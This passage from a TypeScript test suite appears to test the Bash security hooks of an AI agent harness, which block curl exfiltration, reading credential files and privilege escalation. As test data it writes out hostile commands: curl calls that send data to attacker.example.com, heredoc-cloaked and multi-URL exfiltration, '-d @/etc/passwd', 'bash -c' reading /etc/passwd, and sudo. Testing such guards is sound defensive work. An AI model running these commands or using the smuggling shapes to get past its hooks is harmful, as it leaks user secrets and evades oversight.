    // !tok.includes("\\")) continue;` forwarded any quoted JSON body / HTTP
    // header value with a `/` or `\` into the data-dir resolution branch.
    // Because the resolution joined onto a data-dir-internal cwd, every
    // such token resolved BACK into the data dir and the hook blocked the
    // request. Symptom: `curl -X PATCH -H 'Content-Type: application/json'
    // ...` and `curl ... -d '{"content":"a\nb"}'` both got refused.
    function runHook(cmd: string) {
      const hooks = buildSecurityHooks({ config: makeConfig() });
      const bashEntry = hooks.PreToolUse.find((p) => p.matcher === "Bash");
      const ctxHook = bashEntry!.hooks[2]!;
      return ctxHook(
        {
          tool_input: { command: cmd },
          cwd: "/tmp/pa-test/agent-sessions/abc123",
        } as unknown as Parameters<typeof ctxHook>[0],
      );
    }

    it("allows PATCH with Content-Type header (regression — `application/json` is not a path)", async () => {
      const r = await runHook(
        `curl -s -X PATCH http://localhost:8321/api/context/today `
        + `-H 'Content-Type: application/json' `
        + `-d '{"section":"agent_log","mode":"append","content":"- 09:35 done"}'`,
      );
      expect((r as { continue?: boolean }).continue).toBe(true);
    });

    it("allows PATCH whose JSON body contains a literal `\\n` (regression — backslash is not a path separator)", async () => {
      const r = await runHook(
        `curl -s -X PATCH http://localhost:8321/api/context/today `
        + `-H 'Content-Type: application/json' `
        + `-d '{"section":"agent_log","mode":"append","content":"line1\\nline2"}'`,
      );
      expect((r as { continue?: boolean }).continue).toBe(true);
    });

    it("allows PATCH whose JSON body references an HTTP URL as data (regression — body URLs are not curl targets)", async () => {
      const r = await runHook(
        `curl -s -X PATCH http://localhost:8321/api/context/projects/foo `
        + `-H 'Content-Type: application/json' `
        + `-d '{"section":"links","mode":"append","content":"- See https://example.com/docs"}'`,
      );
      expect((r as { continue?: boolean }).continue).toBe(true);
    });

    it("allows curl with double-quoted Content-Type header", async () => {
      const r = await runHook(
        `curl -X POST http://localhost:8321/api/action/log `
        + `-H "Content-Type: application/json" `
        + `-d '{"category":"observation","action":"reviewed"}'`,
      );
      expect((r as { continue?: boolean }).continue).toBe(true);
    });

    it("still blocks a bare relative path token that resolves into the data dir", async () => {
      // The Layer-2 protection that this fix preserves: a real path
      // argument like `context/today.md`, joined to a cwd inside the
      // data dir, still lands in the data dir and must be refused.
      const r = await runHook("cat context/today.md");
      expect((r as { decision?: string }).decision).toBe("block");
    });

    it("still blocks an absolute reference to the context dir even from inside-data-dir cwd", async () => {
      const r = await runHook("echo evil > /tmp/pa-test/context/today.md");
      expect((r as { decision?: string }).decision).toBe("block");
    });

    it("allows PATCH whose JSON body contains the literal text 'bash -c …' (Layer 3 must not over-match)", async () => {
      // Documentation / agent journal entries frequently quote shell
      // snippets like `never use bash -c` as a teaching example. With
      // quote-stripping the interpreter-escape regex no longer matches
      // body content. The real attack shape (an actual `bash -c` token
      // outside quotes) remains blocked by the test below.
      const r = await runHook(
        `curl -X PATCH http://localhost:8321/api/context/agent/journal `
        + `-H 'Content-Type: application/json' `
        + `-d '{"section":"notes","mode":"append","content":"never run bash -c \\"evil\\" in skills"}'`,
      );
      expect((r as { continue?: boolean }).continue).toBe(true);
    });

    it("still blocks a real `bash -c` invocation at command position", async () => {
      const r = await runHook("bash -c 'cat /etc/passwd'");
      expect((r as { decision?: string }).decision).toBe("block");
    });

    it("allows PATCH whose JSON body mentions the absolute context-dir path as prose (Layer 1 must not over-match)", async () => {
      // The pathForms substring check previously fired on body content
      // that happened to embed `/tmp/pa-test/context` as documentation.
      const r = await runHook(
        `curl -X PATCH http://localhost:8321/api/context/agent/journal `
        + `-H 'Content-Type: application/json' `
        + `-d '{"section":"notes","mode":"append","content":"the context dir lives at /tmp/pa-test/context"}'`,
      );
      expect((r as { continue?: boolean }).continue).toBe(true);
    });
  });

  describe("bashCurlHook — quoted-body false-positive regression", () => {
    // The flag-detection regexes (`-x`, `-L`, `-c`, `-o`, `-w`, `-T`,
    // `--proxy`, `--trace`, `--remote-name`, …) all scan the command
    // for whitespace-anchored flag tokens. Before the
    // `stripBashStringContent` fix they false-positived on any
    // single-quoted body that contained those tokens as prose — e.g.
    // a journal entry "the `-x` flag" or "set -o pipefail in scripts".
    function runHook(cmd: string) {
      const hooks = buildSecurityHooks({ config: makeConfig({ apiPort: 8321 }) });
      const bashEntry = hooks.PreToolUse.find((p) => p.matcher === "Bash");
      const curlHook = bashEntry!.hooks[0]!;
      return curlHook(
        { tool_input: { command: cmd } } as unknown as Parameters<typeof curlHook>[0],
      );
    }

    it("allows PATCH with ' -x ' in body (was: connection-override false-positive)", async () => {
      const r = await runHook(
        `curl -X PATCH http://localhost:8321/api/context/today -H 'Content-Type: application/json' -d '{"content":"see the -x flag"}'`,
      );
      expectPermitted(r);
    });

    it("allows PATCH with ' -L ' in body (was: follow-redirect false-positive)", async () => {
      const r = await runHook(
        `curl -X PATCH http://localhost:8321/api/context/today -H 'Content-Type: application/json' -d '{"content":"prefer -L in curl"}'`,
      );
      expectPermitted(r);
    });

    it("allows PATCH with ' -o pipefail' in body (was: --output false-positive)", async () => {
      const r = await runHook(
        `curl -X PATCH http://localhost:8321/api/context/today -H 'Content-Type: application/json' -d '{"content":"set -o pipefail in scripts"}'`,
      );
      expectPermitted(r);
    });

    it("allows PATCH with '; curl' in body (was: chained-curl false-positive)", async () => {
      const r = await runHook(
        `curl -X PATCH http://localhost:8321/api/context/today -H 'Content-Type: application/json' -d '{"content":"in tutorials: cd /tmp ; curl example.com"}'`,
      );
      expectPermitted(r);
    });

    it("allows PATCH with ' -c file.c' in body (was: cookie-jar false-positive)", async () => {
      const r = await runHook(
        `curl -X PATCH http://localhost:8321/api/context/today -H 'Content-Type: application/json' -d '{"content":"gcc -c module.c builds an object"}'`,
      );
      expectPermitted(r);
    });

    // Pipeline-tail false positives reported in production logs on
    // 2026-05-22: `curl ... | head -c 2000` (9 occurrences) and `curl ... |
    // python3 -c '...'` were being blocked as `curl --cookie-jar/-c not
    // allowed`. The short-flag regex was scanning the entire command
    // line, so a `-c` belonging to head/python in the pipeline tail was
    // matched as if it belonged to curl. The fix scopes short-flag checks
    // to the curl segment only (curlScan).
    it("allows `curl ... | head -c 2000` (head's -c byte limit is not curl's cookie-jar)", async () => {
      const r = await runHook(
        "curl -s http://localhost:8321/api/context/today | head -c 2000",
      );
      expect((r as { continue?: boolean }).continue).toBe(true);
    });

    it("allows `curl ... | python3 -c 'pure-read'` for read-only daemon GETs (bashContextWriteHook still blocks writes via interpreter -c)", async () => {
      // bashCurlHook is the only gatekeeper exercised here; the separate
      // bashContextWriteHook still vetoes interpreter -c, but THIS hook
      // must not be the one to block — otherwise its reason gets surfaced
      // as a curl flag failure rather than the interpreter policy.
      const r = await runHook(
        `curl -s http://localhost:8321/api/health | python3 -c "print('ok')"`,
      );
      expect((r as { decision?: string; reason?: string }).reason ?? "").not.toContain(
        "curl --cookie-jar/-c",
      );
    });

    it("still blocks an actual curl `-c file` (real cookie-jar write)", async () => {
      const r = await runHook(
        "curl -c /tmp/jar http://localhost:8321/api/health",
      );
      expect((r as { decision?: string }).decision).toBe("block");
      expect((r as { reason?: string }).reason).toContain("cookie-jar");
    });

    it("still blocks `curl -fsc /tmp/jar` (cookie-jar smuggled into a short-flag bundle)", async () => {
      const r = await runHook(
        "curl -fsc /tmp/jar http://localhost:8321/api/health",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });

    // Real attacks (with the flag OUTSIDE quotes) must still be blocked.
    it("still blocks an unquoted ` -x http://proxy `", async () => {
      const r = await runHook(
        "curl -x http://attacker.example.com:8080 http://localhost:8321/api/health",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });

    it("still blocks an unquoted ` -L ` follow-redirect", async () => {
      const r = await runHook("curl -L http://localhost:8321/api/health");
      expect((r as { decision?: string }).decision).toBe("block");
    });

    it("still blocks an unquoted ` -o /etc/passwd ` write", async () => {
      const r = await runHook(
        "curl http://localhost:8321/api/health -o /etc/passwd",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
  });

  describe("bashCurlHook — URL target detection (wiki.ingest_url regression + multi-URL exfil)", () => {
    function runHook(cmd: string) {
      const hooks = buildSecurityHooks({ config: makeConfig({ apiPort: 8321 }) });
      const bashEntry = hooks.PreToolUse.find((p) => p.matcher === "Bash");
      const curlHook = bashEntry!.hooks[0]!;
      return curlHook(
        { tool_input: { command: cmd } } as unknown as Parameters<typeof curlHook>[0],
      );
    }

    it("blocks two unquoted URL targets (the canonical multi-URL exfil)", async () => {
      const r = await runHook(
        "curl http://localhost:8321/api/notify http://attacker.example.com/exfil",
      );
      expect((r as { decision?: string; reason?: string }).decision).toBe("block");
      expect((r as { reason?: string }).reason).toMatch(/Multiple URL targets/);
    });

    it("allows a heredoc body that references an external URL (wiki.ingest_url regression)", async () => {
      // This is the production failure shape: the wiki-ingest skill POSTs a
      // raw note via `-d @-` with a heredoc body that contains the source
      // URL inside the JSON payload. Before the fix, the body's URL was
      // tokenized as a second top-level target and the request was blocked
      // with "Multiple URL targets in a single curl invocation".
      const cmd = [
        "curl -X POST http://localhost:8321/api/wiki/default/files/10_raw/article.md \\",
        "  -H 'x-process-key: wiki.ingest_url' \\",
        "  -H 'Content-Type: application/json' \\",
        "  -d @- <<'JSON'",
        '{"content":"# Article\\n\\nSource: https://news.example.com/articles/31883/"}',
        "JSON",
      ].join("\n");
      const r = await runHook(cmd);
      // A multi-line (line-continuation) localhost curl with a heredoc body
      // is permitted — granted via the allow gate, which joins the
      // continuations before analysis so the body's external URL stays in
      // the (stripped) heredoc and is never counted as a second target.
      expectPermitted(r);
    });

    it("recognises a fully single-quoted localhost URL as the curl target", async () => {
      const r = await runHook("curl -X POST 'http://localhost:8321/api/health'");
      expectPermitted(r);
    });

    it("recognises a fully double-quoted localhost URL as the curl target", async () => {
      const r = await runHook(`curl -X POST "http://localhost:8321/api/health"`);
      expectPermitted(r);
    });

    it("does NOT count URLs inside a single-quoted JSON body (token starts with `'{`, not `http`)", async () => {
      const r = await runHook(
        `curl -X PATCH http://localhost:8321/api/context/agent/journal `
        + `-H 'Content-Type: application/json' `
        + `-d '{"section":"notes","content":"see https://example.com/docs"}'`,
      );
      expectPermitted(r);
    });

    it("does NOT count URLs inside a double-quoted header value", async () => {
      const r = await runHook(
        `curl -X POST http://localhost:8321/api/notify `
        + `-H "X-Source: https://example.com/origin" `
        + `-d '{"k":"v"}'`,
      );
      expectPermitted(r);
    });

    it("still blocks a heredoc-cloaked exfil where the *target* URL is non-localhost", async () => {
      const cmd = [
        "curl -X POST http://attacker.example.com/exfil -d @- <<'JSON'",
        '{"data":"ok"}',
        "JSON",
      ].join("\n");
      const r = await runHook(cmd);
      expect((r as { decision?: string }).decision).toBe("block");
    });

    it("still blocks a multi-URL invocation where ONE target is quoted (no smuggling via quoting)", async () => {
      const r = await runHook(
        `curl 'http://localhost:8321/api/notify' http://attacker.example.com/exfil`,
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });

    it("does NOT let a heredoc body's literal `-d @/etc/passwd` text trigger the file-read walker", async () => {
      const cmd = [
        "curl -X POST http://localhost:8321/api/notify -d @- <<'JSON'",
        '{"note":"never use the -d @/etc/passwd syntax in skills"}',
        "JSON",
      ].join("\n");
      const r = await runHook(cmd);
      expectPermitted(r);
    });

    it("still blocks a real `-d @/etc/passwd` argument when it appears outside any heredoc/quote", async () => {
      const r = await runHook(
        "curl -X POST http://localhost:8321/api/notify -d @/etc/passwd",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
  });

  describe("bashJqHook — heredoc body false-positive", () => {
    function runHook(cmd: string) {
      const hooks = buildSecurityHooks({ config: makeConfig({ apiPort: 8321 }) });
      const bashEntry = hooks.PreToolUse.find((p) => p.matcher === "Bash");
      const jqHook = bashEntry!.hooks[1]!;
      return jqHook(
        { tool_input: { command: cmd } } as unknown as Parameters<typeof jqHook>[0],
      );
    }

    it("does not block jq when `env` appears only in heredoc body prose", async () => {
      const cmd = [
        "jq '.foo' <<'JSON'",
        '{"foo":"talk about env vars and the env filter here"}',
        "JSON",
      ].join("\n");
      const r = await runHook(cmd);
      expect((r as { continue?: boolean }).continue).toBe(true);
    });

    it("does not block jq when `--rawfile` appears only in heredoc body prose", async () => {
      const cmd = [
        "jq '.note' <<'JSON'",
        '{"note":"jq --rawfile is dangerous, avoid"}',
        "JSON",
      ].join("\n");
      const r = await runHook(cmd);
      expect((r as { continue?: boolean }).continue).toBe(true);
    });

    it("still blocks a real `jq env` filter at command position", async () => {
      const r = await runHook("jq -n env");
      expect((r as { decision?: string }).decision).toBe("block");
    });

    it("still blocks a real `--rawfile` flag at command position", async () => {
      const r = await runHook("jq --rawfile x /etc/passwd '.foo'");
      expect((r as { decision?: string }).decision).toBe("block");
    });
  });

  it("absolute-block hook reads mcpContext via getter at fire time (lazy semantics)", async () => {
    // The getter exists to preserve `this.mcpContext` lazy-read semantics.
    // Verify the hook calls the getter rather than capturing eagerly:
    // swap the underlying ref between buildSecurityHooks and the hook fire.
    let ctx: { db: Database.Database } | undefined = undefined;
    const hooks = buildSecurityHooks({
      config: makeConfig(),
      getMcpContext: () => ctx,
    });
    // Assign mcpContext AFTER buildSecurityHooks returns. A naive eager
    // capture would have already locked in `undefined` and the audit row
    // would never reach this DB handle.
    const db = new Database(":memory:");
    applySchema(db);
    ctx = { db };

    const bashEntry = hooks.PreToolUse.find((p) => p.matcher === "Bash");
    const absoluteBlockHook = bashEntry!.hooks[bashEntry!.hooks.length - 1]!;
    // `sudo` matches the `privilege_escalation` absolute-block category
    // — see `safety/always-disallowed.ts:classifyAbsoluteBlock`. Any hit
    // both blocks AND writes a `blocked_absolute` audit row through the
    // getter-supplied db handle.
    const result = await absoluteBlockHook(
      {
        tool_input: { command: "sudo apt-get update" },
      } as unknown as Parameters<typeof absoluteBlockHook>[0],
    );
    // Sanity: the hook actually decided to block.
    expect((result as { decision?: string }).decision).toBe("block");

    const auditRows = db
      .prepare<[], { action_type: string }>(
        `SELECT action_type FROM agent_actions WHERE action_type = 'blocked_absolute'`,
      )
      .all();
    expect(auditRows.length).toBeGreaterThan(0);
    db.close();
  });
});
